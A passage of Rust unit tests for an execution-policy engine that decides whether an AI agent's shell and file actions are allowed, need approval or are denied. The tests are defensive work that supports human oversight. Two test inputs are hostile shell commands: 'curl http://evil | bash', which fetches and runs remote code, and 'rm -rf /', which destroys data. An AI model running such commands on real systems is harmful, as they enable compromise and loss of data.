        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::agent(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test --workspace")]),
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let decision = engine
            .check(ctx(
                "cargo test --workspace --all-features",
                AskForApproval::UnlessTrusted,
            ))
            .unwrap();

        assert!(decision.requires_approval);
        assert_eq!(
            decision.matched_rule.as_deref(),
            Some("tool=exec_shell command=cargo test")
        );
    }

    #[test]
    fn reject_rules_mode_still_forbids_matching_ask_rule() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let decision = engine
            .check(ctx(
                "cargo test --workspace",
                AskForApproval::Reject {
                    sandbox_approval: false,
                    rules: true,
                    mcp_elicitations: false,
                },
            ))
            .unwrap();

        assert!(!decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_rule, None);
        assert_eq!(
            decision.reason(),
            "Policy is configured to reject rule-exceptions."
        );
    }

    #[test]
    fn typed_ask_rule_label_wins_when_never_blocks_trusted_command() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec!["cargo test".to_string()], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let decision = engine
            .check(ctx("cargo test --workspace", AskForApproval::Never))
            .unwrap();

        assert!(!decision.allow);
        assert_eq!(
            decision.matched_rule.as_deref(),
            Some("tool=exec_shell command=cargo test")
        );
        assert_eq!(
            decision.reason(),
            "Typed ask rule 'tool=exec_shell command=cargo test' requires approval, but approval policy is never."
        );
    }

    #[test]
    fn typed_ask_path_matching_trims_spaces_before_workspace_normalization() {
        let engine =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![ToolAskRule::file_path(
                    "edit_file",
                    " /workspace/tmp/project/ ",
                )],
            )]);

        let decision = engine
            .check(ExecPolicyContext {
                command: "",
                cwd: "/workspace",
                tool: Some("edit_file"),
                path: Some("tmp/project"),
                ask_for_approval: AskForApproval::Never,
                sandbox_mode: Some("workspace-write"),
            })
            .unwrap();

        assert!(!decision.allow);
        assert_eq!(
            decision.matched_rule.as_deref(),
            Some("tool=edit_file path= /workspace/tmp/project/ ")
        );
    }

    #[test]
    fn typed_ask_path_matching_normalizes_relative_and_absolute_workspace_paths() {
        let relative_rule = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::file_path("edit_file", "src/a.rs")]),
        ]);
        let absolute_path = relative_rule
            .check(ExecPolicyContext {
                command: "",
                cwd: "/workspace",
                tool: Some("edit_file"),
                path: Some("/workspace/src/a.rs"),
                ask_for_approval: AskForApproval::OnFailure,
                sandbox_mode: Some("workspace-write"),
            })
            .unwrap();
        assert!(absolute_path.requires_approval);

        let absolute_rule =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![ToolAskRule::file_path("edit_file", "/workspace/src/a.rs")],
            )]);
        let relative_path = absolute_rule
            .check(ExecPolicyContext {
                command: "",
                cwd: "/workspace",
                tool: Some("edit_file"),
                path: Some("src/a.rs"),
                ask_for_approval: AskForApproval::OnFailure,
                sandbox_mode: Some("workspace-write"),
            })
            .unwrap();
        assert!(relative_path.requires_approval);
    }

    #[test]
    fn typed_ask_path_matching_rejects_traversal_and_external_paths() {
        for (rule_path, path) in [
            ("src/a.rs", "../src/a.rs"),
            ("src/a.rs", "/workspace/src/../src/a.rs"),
            ("src/a.rs", "/src/a.rs"),
            ("../src/a.rs", "src/a.rs"),
            ("/src/a.rs", "src/a.rs"),
        ] {
            let engine = ExecPolicyEngine::with_rulesets(vec![
                Ruleset::user(vec![], vec![])
                    .with_ask_rules(vec![ToolAskRule::file_path("edit_file", rule_path)]),
            ]);
            let decision = engine
                .check(ExecPolicyContext {
                    command: "",
                    cwd: "/workspace",
                    tool: Some("edit_file"),
                    path: Some(path),
                    ask_for_approval: AskForApproval::OnFailure,
                    sandbox_mode: Some("workspace-write"),
                })
                .unwrap();
            assert_eq!(
                decision.matched_rule, None,
                "rule {rule_path:?} and path {path:?} must not match"
            );
        }
    }

    #[test]
    fn typed_ask_path_matching_accepts_windows_separators() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::file_path("edit_file", r"src\a.rs")]),
        ]);

        let decision = engine
            .check(ExecPolicyContext {
                command: "",
                cwd: r"C:\workspace",
                tool: Some("edit_file"),
                path: Some(r"C:\workspace\src\a.rs"),
                ask_for_approval: AskForApproval::OnFailure,
                sandbox_mode: Some("workspace-write"),
            })
            .unwrap();

        assert!(decision.requires_approval);
    }

    // ── deny / allow action tests ──────────────────────────────────────────

    #[test]
    fn deny_action_blocks_regardless_of_mode() {
        let engine =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![ToolAskRule {
                    tool: "exec_shell".into(),
                    command: Some("sed".into()),
                    path: None,
                    action: PermissionAction::Deny,
                }],
            )]);

        // sed should be blocked even under UnlessTrusted
        let decision = engine
            .check(ExecPolicyContext {
                command: "sed -i 's/foo/bar/' file.txt",
                cwd: "/tmp",
                tool: Some("exec_shell"),
                path: None,
                ask_for_approval: AskForApproval::UnlessTrusted,
                sandbox_mode: None,
            })
            .unwrap();

        assert!(!decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_action, Some(PermissionAction::Deny));
        assert_eq!(decision.requirement.phase(), "forbidden");
        assert!(
            decision.reason().contains("explicitly denies"),
            "expected deny reason, got: {}",
            decision.reason()
        );
    }

    #[test]
    fn allow_action_skips_approval_regardless_of_mode() {
        let engine =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![ToolAskRule {
                    tool: "exec_shell".into(),
                    command: Some("git status".into()),
                    path: None,
                    action: PermissionAction::Allow,
                }],
            )]);

        // git status should be allowed even under OnRequest
        let decision = engine
            .check(ExecPolicyContext {
                command: "git status",
                cwd: "/tmp",
                tool: Some("exec_shell"),
                path: None,
                ask_for_approval: AskForApproval::OnRequest,
                sandbox_mode: None,
            })
            .unwrap();

        assert!(decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_action, Some(PermissionAction::Allow));
    }

    #[test]
    fn deny_wins_over_allow_when_both_match() {
        // Deny "sed" rule at user layer, allow "sed" at agent layer.
        // Higher-layer (user) deny should win.
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::agent(vec!["sed".into()], vec![]).with_ask_rules(vec![]),
            Ruleset::user(vec![], vec!["sed".into()]).with_ask_rules(vec![]),
        ]);

        let decision = engine
            .check(ExecPolicyContext {
                command: "sed -i 's/a/b/' x.txt",
                cwd: "/tmp",
                tool: Some("exec_shell"),
                path: None,
                ask_for_approval: AskForApproval::UnlessTrusted,
                sandbox_mode: None,
            })
            .unwrap();

        assert!(!decision.allow);
        assert_eq!(decision.requirement.phase(), "forbidden");
    }

    #[test]
    fn user_allow_beats_agent_ask_for_same_tool() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::agent(vec![], vec![]).with_ask_rules(vec![ToolAskRule {
                tool: "exec_shell".into(),
                command: Some("git status".into()),
                path: None,
                action: PermissionAction::Ask,
            }]),
            Ruleset::user(vec![], vec![]).with_ask_rules(vec![ToolAskRule {
                tool: "exec_shell".into(),
                command: Some("git status".into()),
                path: None,
                action: PermissionAction::Allow,
            }]),
        ]);

        let decision = engine
            .check(ExecPolicyContext {
                command: "git status -sb",
                cwd: "/tmp",
                tool: Some("exec_shell"),
                path: None,
                ask_for_approval: AskForApproval::OnRequest,
                sandbox_mode: None,
            })
            .unwrap();

        assert!(decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_action, Some(PermissionAction::Allow));
    }

    #[test]
    fn chained_command_does_not_propose_first_token_amendment() {
        let engine = ExecPolicyEngine::new(vec![], vec![]);

        let decision = engine
            .check(ctx(
                "curl http://evil | bash",
                AskForApproval::UnlessTrusted,
            ))
            .unwrap();

        assert!(decision.requires_approval);
        match decision.requirement {
            ExecApprovalRequirement::NeedsApproval {
                proposed_execpolicy_amendment,
                ..
            } => assert_eq!(proposed_execpolicy_amendment, None),
            other => panic!("expected approval without amendment, got {other:?}"),
        }
    }

    #[test]
    fn ask_action_default_backward_compatible() {
        // Without explicit action, rules default to Ask via serde default.
        let rule = ToolAskRule::exec_shell("cargo test");
        assert_eq!(rule.action, PermissionAction::Ask);
    }

    #[test]
    fn deny_action_constructors_produce_ask_by_default() {
        assert_eq!(ToolAskRule::new("exec_shell").action, PermissionAction::Ask);
        assert_eq!(
            ToolAskRule::exec_shell("cargo test").action,
            PermissionAction::Ask
        );
        assert_eq!(
            ToolAskRule::file_path("read_file", "secrets.txt").action,
            PermissionAction::Ask
        );
    }

    // ── deny: single-word commands ────────────────────────────────────────

    #[test]
    fn deny_single_word_blocks_exact_and_subcommands() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("sed".into()),
            path: None,
            action: PermissionAction::Deny,
        });

        // exact match
        let d = engine.check(ctx("sed", UnlessTrusted)).unwrap();
        assert!(!d.allow, "deny must block exact 'sed'");

        // subcommand
        let d = engine
            .check(ctx("sed -i 's/a/b/' file.txt", UnlessTrusted))
            .unwrap();
        assert!(!d.allow, "deny must block 'sed -i …'");
    }

    #[test]
    fn deny_single_word_does_not_block_unrelated() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("sed".into()),
            path: None,
            action: PermissionAction::Deny,
        });

        // unrelated command passes through
        let d = engine
            .check(ctx("awk '{print $1}'", UnlessTrusted))
            .unwrap();
        assert!(d.allow, "deny 'sed' must not block 'awk'");
    }

    #[test]
    fn deny_word_boundary_prevents_false_positives() {
        // "rm" must block "rm -rf /" but NOT "rmdir"
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("rm".into()),
            path: None,
            action: PermissionAction::Deny,
        });

        assert!(!engine.check(ctx("rm -rf /", UnlessTrusted)).unwrap().allow);
        assert!(
            engine
                .check(ctx("rmdir empty-dir", UnlessTrusted))
                .unwrap()
                .allow
        );
    }

    // ── deny: multi-word commands ─────────────────────────────────────────

    #[test]
    fn deny_multi_word_blocks_subcommands() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("git push".into()),
            path: None,
            action: PermissionAction::Deny,
        });

        assert!(!engine.check(ctx("git push", UnlessTrusted)).unwrap().allow);
        assert!(
            !engine
                .check(ctx("git push origin main", UnlessTrusted))
                .unwrap()
                .allow
        );
        assert!(
            !engine
                .check(ctx("git push --force", UnlessTrusted))
                .unwrap()
                .allow
        );
    }

    #[test]
    fn deny_multi_word_distinguishes_from_sibling_subcommands() {
        // "git push" must NOT block "git pull"
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("git push".into()),
            path: None,
            action: PermissionAction::Deny,
        });

        assert!(engine.check(ctx("git pull", UnlessTrusted)).unwrap().allow);
        assert!(
            engine
                .check(ctx("git pull origin main", UnlessTrusted))
                .unwrap()
                .allow
        );
        assert!(
            engine
                .check(ctx("git status", UnlessTrusted))
                .unwrap()
                .allow
        );
    }

    #[test]
    fn deny_multi_word_via_denied_prefixes_path() {
        // When ruleset() promotes deny→denied_prefixes, the word-boundary
        // path in check() handles it identically.
        let engine = ExecPolicyEngine::new(vec![], vec!["git push".into()]);

        assert!(
            !engine
                .check(ctx("git push --force", UnlessTrusted))
                .unwrap()
                .allow
        );
        assert!(engine.check(ctx("git pull", UnlessTrusted)).unwrap().allow);
    }

    // ── deny: priority ────────────────────────────────────────────────────

    #[test]
    fn deny_wins_over_allow_via_ask_rules() {
        let engine =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![
                    ToolAskRule {
                        tool: "exec_shell".into(),
                        command: Some("sed".into()),
                        path: None,
                        action: PermissionAction::Allow,
                    },
                    ToolAskRule {
                        tool: "exec_shell".into(),
                        command: Some("sed".into()),
                        path: None,
                        action: PermissionAction::Deny,
                    },
                ],
            )]);

        // Both match; deny should win (execpolicy early-return for deny
        // fires before allow).
        let d = engine
            .check(ctx("sed -i 's/a/b/' x.txt", UnlessTrusted))
            .unwrap();
        assert!(!d.allow, "deny must win over allow");
    }

    #[test]
    fn deny_wins_over_allow_via_ask_rules_regardless_of_order() {
        let engine =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![
                    ToolAskRule {
                        tool: "exec_shell".into(),
                        command: Some("sed".into()),
                        path: None,
                        action: PermissionAction::Deny,
                    },
                    ToolAskRule {
                        tool: "exec_shell".into(),
                        command: Some("sed".into()),
                        path: None,
                        action: PermissionAction::Allow,
                    },
                ],
            )]);

        let d = engine
            .check(ctx("sed -i 's/a/b/' x.txt", UnlessTrusted))
            .unwrap();
        assert!(!d.allow, "deny must win even if allow appears later");
        assert_eq!(d.matched_action, Some(PermissionAction::Deny));
    }

    #[test]
    fn path_deny_wins_over_path_allow_regardless_of_order() {
        let engine =
            ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(
                vec![
                    ToolAskRule {
                        tool: "write_file".into(),
                        command: None,
                        path: Some("src/secrets.rs".into()),
                        action: PermissionAction::Deny,
                    },
                    ToolAskRule {
                        tool: "write_file".into(),
                        command: None,
                        path: Some("src/secrets.rs".into()),
                        action: PermissionAction::Allow,
                    },
                ],
            )]);

        let d = engine
            .check(ExecPolicyContext {
                command: "",
                cwd: "/workspace",
                tool: Some("write_file"),
                path: Some("/workspace/src/secrets.rs"),
                ask_for_approval: UnlessTrusted,
                sandbox_mode: None,
            })
            .unwrap();

        assert!(!d.allow, "path deny must win even if allow appears later");
        assert_eq!(d.matched_action, Some(PermissionAction::Deny));
    }

    #[test]
    fn file_path_deny_wins_over_ask_and_allow_for_same_tool_and_path() {
        let engine = engine_with_ask_rules(vec![
            path_rule("write_file", "src/secrets.rs", PermissionAction::Allow),
            path_rule("write_file", "src/secrets.rs", PermissionAction::Ask),
            path_rule("write_file", "src/secrets.rs", PermissionAction::Deny),
        ]);

        let d = engine
            .check(file_ctx(
                "write_file",
                "/workspace/src/secrets.rs",
                "/workspace",
                OnRequest,
            ))
            .unwrap();

        assert!(!d.allow);
        assert!(!d.requires_approval);
        assert_eq!(d.matched_action, Some(PermissionAction::Deny));
        assert_eq!(
            d.matched_rule.as_deref(),
            Some("tool=write_file path=src/secrets.rs")
        );
    }

    #[test]
    fn file_path_specificity_selects_path_rule_when_action_ties() {
        let engine = engine_with_ask_rules(vec![
            tool_rule("write_file", PermissionAction::Allow),
            path_rule("write_file", "src/secrets.rs", PermissionAction::Allow),
        ]);

        let d = engine
            .check(file_ctx(
                "write_file",
                "/workspace/src/secrets.rs",
                "/workspace",
                OnRequest,
            ))
            .unwrap();

        assert!(d.allow);
        assert!(!d.requires_approval);
        assert_eq!(d.matched_action, Some(PermissionAction::Allow));
        assert_eq!(
            d.matched_rule.as_deref(),
            Some("tool=write_file path=src/secrets.rs")
        );
    }

    #[test]
    fn file_action_precedence_outranks_path_specificity() {
        let engine = engine_with_ask_rules(vec![
            tool_rule("write_file", PermissionAction::Deny),
            path_rule("write_file", "src/secrets.rs", PermissionAction::Allow),
        ]);

        let d = engine
            .check(file_ctx(
                "write_file",
                "/workspace/src/secrets.rs",
                "/workspace",
                OnRequest,
            ))
            .unwrap();

        assert!(!d.allow, "less-specific deny must beat path-specific allow");
        assert!(!d.requires_approval);
        assert_eq!(d.matched_action, Some(PermissionAction::Deny));
        assert_eq!(d.matched_rule.as_deref(), Some("tool=write_file"));
    }

    #[test]
    fn file_action_precedence_uses_workspace_relative_normalization() {
        for (deny_path, allow_path, invocation_path) in [
            ("src/a.rs", "/workspace/src/a.rs", "/workspace/src/a.rs"),
            ("/workspace/src/a.rs", "src/a.rs", "src/a.rs"),
        ] {
            let engine = engine_with_ask_rules(vec![
                path_rule("write_file", allow_path, PermissionAction::Allow),
                path_rule("write_file", deny_path, PermissionAction::Deny),
            ]);

            let d = engine
                .check(file_ctx(
                    "write_file",
                    invocation_path,
                    "/workspace",
                    OnRequest,
                ))
                .unwrap();

            assert!(
                !d.allow,
                "deny path {deny_path:?} should beat allow path {allow_path:?} for invocation {invocation_path:?}"
            );
            assert_eq!(d.matched_action, Some(PermissionAction::Deny));
        }
    }

    #[test]
    fn file_action_precedence_normalizes_windows_separators() {
        let engine = engine_with_ask_rules(vec![
            path_rule("write_file", r"src\a.rs", PermissionAction::Allow),
            path_rule("write_file", "src/a.rs", PermissionAction::Deny),
        ]);

        let d = engine
            .check(file_ctx(
                "write_file",
                r"C:\workspace\src\a.rs",
                r"C:\workspace",
                OnRequest,
            ))
            .unwrap();

        assert!(!d.allow);
        assert_eq!(d.matched_action, Some(PermissionAction::Deny));
        assert_eq!(
            d.matched_rule.as_deref(),
            Some("tool=write_file path=src/a.rs")
        );
    }

    #[test]
    fn file_path_actions_are_scoped_by_tool_for_read_write_and_apply_patch() {
        let engine = engine_with_ask_rules(vec![
            path_rule("read_file", "src/shared.rs", PermissionAction::Deny),
            path_rule("write_file", "src/shared.rs", PermissionAction::Ask),
            path_rule("apply_patch", "src/shared.rs", PermissionAction::Allow),
        ]);

        let read = engine
            .check(file_ctx(
                "read_file",
                "/workspace/src/shared.rs",
                "/workspace",
                OnRequest,
            ))
            .unwrap();
        assert!(!read.allow);
        assert!(!read.requires_approval);
        assert_eq!(read.matched_action, Some(PermissionAction::Deny));

        let write = engine
            .check(file_ctx(
                "write_file",
                "/workspace/src/shared.rs",
                "/workspace",
                OnFailure,
            ))
            .unwrap();
        assert!(write.allow);
        assert!(write.requires_approval);
        assert_eq!(write.matched_action, Some(PermissionAction::Ask));

        let patch = engine
            .check(file_ctx(
                "apply_patch",
                "/workspace/src/shared.rs",
                "/workspace",
                OnRequest,
            ))
            .unwrap();
        assert!(patch.allow);
        assert!(!patch.requires_approval);
        assert_eq!(patch.matched_action, Some(PermissionAction::Allow));
    }

    #[test]
    fn deny_via_prefixes_wins_over_allow_via_prefixes() {
        // denied_prefixes checked first, before trusted_prefixes.
        let engine = ExecPolicyEngine::new(vec!["sed".into()], vec!["sed".into()]);

        let d = engine
            .check(ctx("sed -i 's/a/b/' x.txt", UnlessTrusted))
            .unwrap();
        assert!(!d.allow, "denied prefix must win over trusted prefix");
    }

    #[test]
    fn deny_tool_only_without_command_blocks_every_invocation() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: None,
            path: None,
            action: PermissionAction::Deny,
        });

        // any exec_shell command should be blocked
        assert!(
            !engine
                .check(ctx("git status", UnlessTrusted))
                .unwrap()
                .allow
        );
        assert!(
            !engine
                .check(ctx("cargo build", UnlessTrusted))
                .unwrap()
                .allow
        );
        assert!(
            !engine
                .check(ctx("echo hello", UnlessTrusted))
                .unwrap()
                .allow
        );
    }

    // ── allow: single / multi-word ────────────────────────────────────────

    #[test]
    fn allow_single_word_skips_approval() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("cargo".into()),
            path: None,
            action: PermissionAction::Allow,
        });

        let d = engine
            .check(ctx("cargo build --release", OnRequest))
            .unwrap();
        assert!(d.allow);
        assert!(!d.requires_approval);
        assert_eq!(d.matched_action, Some(PermissionAction::Allow));
    }

    #[test]
    fn allow_multi_word_skips_approval() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("git status".into()),
            path: None,
            action: PermissionAction::Allow,
        });

        let d = engine.check(ctx("git status --short", OnRequest)).unwrap();
        assert!(d.allow);
        assert!(!d.requires_approval);
    }

    #[test]
    fn allow_does_not_leak_to_unmatched_commands() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("git status".into()),
            path: None,
            action: PermissionAction::Allow,
        });

        // Unrelated command: normal approval flow applies.
        let d = engine
            .check(ctx("git push origin main", UnlessTrusted))
            .unwrap();
        // UnlessTrusted without a trusted prefix: requires approval
        assert!(d.requires_approval);
    }

    #[test]
    fn allow_under_never_mode_still_allows() {
        // allow action must bypass even strict Never mode.
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("cargo".into()),
            path: None,
            action: PermissionAction::Allow,
        });

        let d = engine.check(ctx("cargo check", Never)).unwrap();
        assert!(d.allow);
        assert!(!d.requires_approval);
    }

    // ── ask: default / backward compat ────────────────────────────────────

    #[test]
    fn ask_action_behaves_like_before_action_field_existed() {
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("cargo test".into()),
            path: None,
            action: PermissionAction::Ask,
        });

        // Under UnlessTrusted: ask rule forces approval
        let d = engine
            .check(ctx("cargo test --workspace", UnlessTrusted))
            .unwrap();
        assert!(d.allow);
        assert!(d.requires_approval);

        // Under Never: ask rule is forbidden
        let d = engine.check(ctx("cargo test --workspace", Never)).unwrap();
        assert!(!d.allow);
        assert_eq!(d.requirement.phase(), "forbidden");
    }

    #[test]
    fn ask_is_default_when_action_omitted() {
        let rule = ToolAskRule::exec_shell("cargo test");
        assert_eq!(rule.action, PermissionAction::Ask);
    }

    // ── cross-cutting ─────────────────────────────────────────────────────

    #[test]
    fn deny_blocks_tool_only_even_for_different_tool() {
        // deny on "exec_shell" must not affect "write_file"
        let engine = engine_with_ask_rule(ToolAskRule {
            tool: "exec_shell".into(),
            command: Some("sed".into()),
            path: None,
            action: PermissionAction::Deny,
        });

        let d = engine
            .check(ExecPolicyContext {
                command: "",
                cwd: "/workspace",
                tool: Some("write_file"),
                path: Some("/workspace/src/main.rs"),
                ask_for_approval: UnlessTrusted,
                sandbox_mode: None,
            })
            .unwrap();
        // write_file should not be affected by exec_shell deny
        assert!(d.allow);
    }

    #[test]
    fn normalize_handles_extra_whitespace_in_command() {
        // "git  status" (double space) normalizes to "git status"
        let engine = ExecPolicyEngine::new(vec![], vec!["git push".into()]);

        let d = engine
            .check(ctx("git   push   --force", UnlessTrusted))
            .unwrap();
        assert!(!d.allow, "extra whitespace must not bypass deny");
    }

    #[test]
    fn normalize_handles_case_insensitivity() {
        // normalize_command lowercases — "SED" matches "sed"
        let engine = ExecPolicyEngine::new(vec![], vec!["sed".into()]);

        let d = engine
            .check(ctx("SED -i 's/a/b/' file.txt", UnlessTrusted))
            .unwrap();
        assert!(!d.allow, "case must not bypass deny");
    }

    #[test]
    fn allow_falls_back_to_mode_when_no_rule_matches() {
        let engine = ExecPolicyEngine::new(vec![], vec![]); // no rules

        let d = engine.check(ctx("cargo build", UnlessTrusted)).unwrap();
        assert!(d.allow);
        assert!(d.requires_approval, "untrusted cmd needs approval");
    }

    // ── helpers ───────────────────────────────────────────────────────────

    fn engine_with_ask_rule(rule: ToolAskRule) -> ExecPolicyEngine {
        engine_with_ask_rules(vec![rule])
    }

    fn engine_with_ask_rules(rules: Vec<ToolAskRule>) -> ExecPolicyEngine {
        ExecPolicyEngine::with_rulesets(vec![Ruleset::user(vec![], vec![]).with_ask_rules(rules)])
    }

    fn tool_rule(tool: &str, action: PermissionAction) -> ToolAskRule {
        ToolAskRule {
            tool: tool.to_string(),
            command: None,
            path: None,
            action,
        }
    }

    fn path_rule(tool: &str, path: &str, action: PermissionAction) -> ToolAskRule {
        ToolAskRule {
            tool: tool.to_string(),
            command: None,
            path: Some(path.to_string()),
            action,
        }
    }

    fn file_ctx<'a>(
        tool: &'a str,
        path: &'a str,
        cwd: &'a str,
        ask_for_approval: AskForApproval,
    ) -> ExecPolicyContext<'a> {
        ExecPolicyContext {
            command: "",
            cwd,
            tool: Some(tool),
            path: Some(path),
            ask_for_approval,
            sandbox_mode: Some("workspace-write"),
        }
    }
}
